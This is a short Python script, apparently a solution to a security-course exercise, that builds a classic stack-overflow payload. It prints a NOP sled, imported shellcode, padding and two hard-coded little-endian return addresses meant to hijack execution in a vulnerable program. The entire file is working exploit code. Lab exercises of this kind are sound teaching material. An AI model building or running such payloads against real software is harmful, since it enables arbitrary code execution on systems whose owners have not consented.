#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"\x90"*600)
sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b"\x90"*401)
sys.stdout.buffer.write(pack("<I",0xfffeb534))
sys.stdout.buffer.write(pack("<I",0xfffeb0f0))

